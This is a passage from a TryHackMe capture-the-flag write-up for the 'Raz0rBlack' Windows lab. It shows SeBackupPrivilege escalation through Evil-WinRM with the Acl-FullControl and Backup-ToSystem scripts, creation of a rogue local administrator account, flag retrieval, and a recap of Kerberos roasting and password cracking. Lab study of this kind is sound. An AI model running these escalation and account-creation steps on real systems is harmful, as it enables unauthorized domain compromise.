*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== ============================================
raz0rblack\xyan1d3 S-1-5-21-3403444377-2687699443-13012745-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## Privilege Escalation

Using Luis Vaca's [Acl-FullControl.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1) script we'll take full control on the C:\windows\system32\drivers\etc path. Which will later on allow us to do some further privilege escalation.

```
└─$ evil-winrm  -i RAZ0RBLACK.THM  -u xyan1d3 -p cyanide9amine5628 -s '/home/kali/tryhackme/raz0rblack/scripts/'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Acl-FullControl.ps1
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Acl-FullControl -user RAZ0RBLACK.THM\xyan1d3 C:\windows\system32\drivers\etc
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32\drivers\etc
Owner  : NT SERVICE\TrustedInstaller
Group  : NT SERVICE\TrustedInstaller
Access : CREATOR OWNER Allow  268435456
         NT AUTHORITY\SYSTEM Allow  268435456
         NT AUTHORITY\SYSTEM Allow  Modify, Synchronize
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Administrators Allow  Modify, Synchronize
         BUILTIN\Users Allow  -1610612736
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         NT SERVICE\TrustedInstaller Allow  268435456
         NT SERVICE\TrustedInstaller Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464G:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;
         BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICI
         IO;GXGR;;;S-1-15-2-2)



[+] Changing permissions to C:\windows\system32\drivers\etc
[+] Acls changed successfully.


Path   : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32\drivers\etc
Owner  : NT SERVICE\TrustedInstaller
Group  : NT SERVICE\TrustedInstaller
Access : CREATOR OWNER Allow  268435456
         NT AUTHORITY\SYSTEM Allow  268435456
         NT AUTHORITY\SYSTEM Allow  Modify, Synchronize
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Administrators Allow  Modify, Synchronize
         BUILTIN\Users Allow  -1610612736
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         RAZ0RBLACK\xyan1d3 Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  :
Sddl   : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464G:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;
         BU)(A;;0x1200a9;;;BU)(A;OICI;FA;;;S-1-5-21-3403444377-2687699443-13012745-1106)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;OICIIO;GXG
         R;;;AC)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;S-1-15-2-2)(A;;0x1200a9;;;S-1-15-2-2)



*Evil-WinRM* PS C:\Users\xyan1d3\Documents> 
```

Now that we changed the perms, we have Full Control on the C:\windows\system32\drivers\etc path, following Luis Vacas's article we can leverage on the Backup-ToSystem powershell script to execute commands as System.

I tried different things here, what worked for me was creating a new account and making the user a member of the local Administrators group.

### Create new administrator account

Creating the account by running Backup-ToSystem:

```
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Backup-ToSystem.ps1


*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Backup-ToSystem -command "net user nico tryhackme123 /add"
   ___            _               ____  __           _
  / __\ __ _  ___| | ___   _ _ __|___ \/ _\_   _ ___| |_ ___ _ __ ___
 /__\/// _` |/ __| |/ / | | | '_ \ __) \ \| | | / __| __/ _ \ '_ ` _ \
/ \/  \ (_| | (__|   <| |_| | |_) / __/_\ \ |_| \__ \ ||  __/ | | | | |
\_____/\__,_|\___|_|\_\\__,_| .__/_____\__/\__, |___/\__\___|_| |_| |_|
                            |_|            |___/
                                                   by CyberVaca
[+] Backup ACL
[+] Changing ACL
[+] Writing Payload
[+] Trigger Payload
[+] Deleting temp Files
[+] Restore files
[+] Restore backup ACL
```

We can check the current user permissions with net user:

```
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> net user nico
User name                    nico
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/31/2021 10:49:31 AM
Password expires             Never
Password changeable          7/31/2021 10:49:31 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

We make the new user nico part of the local administrators:

```
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Backup-ToSystem -command "net localgroup administrators nico /add"
   ___            _               ____  __           _
  / __\ __ _  ___| | ___   _ _ __|___ \/ _\_   _ ___| |_ ___ _ __ ___
 /__\/// _` |/ __| |/ / | | | '_ \ __) \ \| | | / __| __/ _ \ '_ ` _ \
/ \/  \ (_| | (__|   <| |_| | |_) / __/_\ \ |_| \__ \ ||  __/ | | | | |
\_____/\__,_|\___|_|\_\\__,_| .__/_____\__/\__, |___/\__\___|_| |_| |_|
                            |_|            |___/
                                                   by CyberVaca
[+] Backup ACL
[+] Changing ACL
[+] Writing Payload
[+] Trigger Payload
[+] Deleting temp Files
[+] Restore files
[+] Restore backup ACL
```

And verify that our permissions have changed:

```
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> net user nico
User name                    nico

...

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> 
```

## Log in as nico!

Now that we have created our account with Admin privileges, we'll log into the box as nico and will try to  obtain the root flag!

```
┌──(kali㉿kali)-[~/tryhackme/raz0rblack]
└─$ evil-winrm  -i  RAZ0RBLACK.THM -u nico -p tryhackme123                                                                                          127 ⨯

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nico\Documents> whoami
raz0rblack\nico
*Evil-WinRM* PS C:\Users\nico\Documents> cd ..
*Evil-WinRM* PS C:\Users\nico> cd ..
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2021   9:45 AM                3D Objects
d-r---        5/21/2021   9:45 AM                Contacts
d-r---        5/21/2021   9:45 AM                Desktop
d-r---        5/21/2021   9:45 AM                Documents
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml


*Evil-WinRM* PS C:\Users\Administrator> type root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\Administrator> 


*Evil-WinRM* PS C:\Users\Administrator> $credential = Import-CliXml -Path 'root.xml'
The data is invalid.

At line:1 char:15
+ $credential = Import-CliXml -Path 'root.xml'
+               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Clixml], CryptographicException
    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicException,Microsoft.PowerShell.Commands.ImportClixmlCommand
```

As we can see above the contents of the xml file could not be decoded, but the ciphertext looks suspiciously hex encoded. 
A quick check on cyberchef reveals the root flag!.

![root flag](cyberchef_root_flag.png)

## Finding Tyson's flag

Because we are already logged in with an administrator account (nico), we can list the files in C:\Users\twilliams

```
*Evil-WinRM* PS C:\Users> cd twilliams
*Evil-WinRM* PS C:\Users\twilliams> dir


    Directory: C:\Users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
                                                 finitely_definitely_not_a_flag.exe
```

A suspicious file there claiming not to be flag, it must be that one! We can get the flag by priting its content to the console:

```
*Evil-WinRM* PS C:\Users\twilliams> type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe                                                                                                                                                                     
THM{5144f2c4107b7cab04916724e3749fb0}                                                                                                                                                                                        
*Evil-WinRM* PS C:\Users\twilliams> 
```

## Finding the complete top secret!

Last but not least we need to find the top secret file in order to answer the last question, What is the complete top secret?

I used a little bit of Powershell to find the files which name contains the word "secret" and luckily that payed back.
There is a top_secret.png file in C:\Program Files\Top Secret.

```
*Evil-WinRM* PS C:\> Get-ChildItem  -Recurse  | where  {$_.Name -like "*secret*"}


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2021  10:13 AM                Top Secret


    Directory: C:\Program Files\Top Secret


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  10:13 AM         449195 top_secret.png

*Evil-WinRM* PS C:\Program Files\Top Secret> dir


    Directory: C:\Program Files\Top Secret


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  10:13 AM         449195 top_secret.png



*Evil-WinRM* PS C:\Program Files\Top Secret> download top_secret.png
Info: Downloading C:\Program Files\Top Secret\top_secret.png to top_secret.png

                                                             
Info: Download successful!
```

After downloading the file we can see the following image, which shows a melting chocolate gorilla, telling us how to exit vim, but looks like he didn't have enough time to complete the answer:

![top secret](top_secret.png)

But we know the answer, we can close vim with :wq (:x also works and is shorter, but won't help for this case).

## Conclusion

Tracing the thread back. This machine could be fully compromised due to the following chain of misconfigurations / vulnerabilities:

1. Incorrect permission configurations first to mount the nfs share.
2. Sensitive data left unprotected that allowed us to figure out some account names.
3. Probing kerberos with kerbrute for those account names we found that twilliams did not require pre-authentication to obtain kerberos tickets (misconfiguration).
4. The twilliams user password obtained from cracking the kerberos TGT ticket hash was reused in sbradley's account, which also required a password change.
5. With sbradley's account, the thrash smb share exposed a password protected zip file holding an old backup of system credentials and hashes.
6. After cracking the zip file password with a dictionary attack, we used the brute forced the list of users we gathered from the previous steps with the hashes obtained from the zip file and we found a match for the current lvetrova user.
7. With lvetrova's access we were able to obtain a kerberos TGS ticket to xyan1d3's service, which allowed us to crack xyan1d3's password.
8. xyan1d3's user had backup privileges, using Luis Vaca's tool we were able to run commands as SYSTEM, which we used to create a new account with local administrator privileges.

As we can see below, in this machine we progressed from mounting an nfs share without a user account to full local admin privileges:

 X -> twilliams -> sbradley -> lvetrova -> xyan1d3 -> admin
 
 We can conclude then that this machine was hacked because of improper configuration (some privileges were more open than they should) and also exposure of sensitive data (user account names and old system dumps).

## Thanks

Thank you for reading this. If you wish to contact me and suggest any amendments or changes, you can reach me out on [linkedin](https://es.linkedin.com/in/nicol%C3%A1s-palumbo-9372615) or [TryHackMe](https://tryhackme.com/p/nicopalumbo).
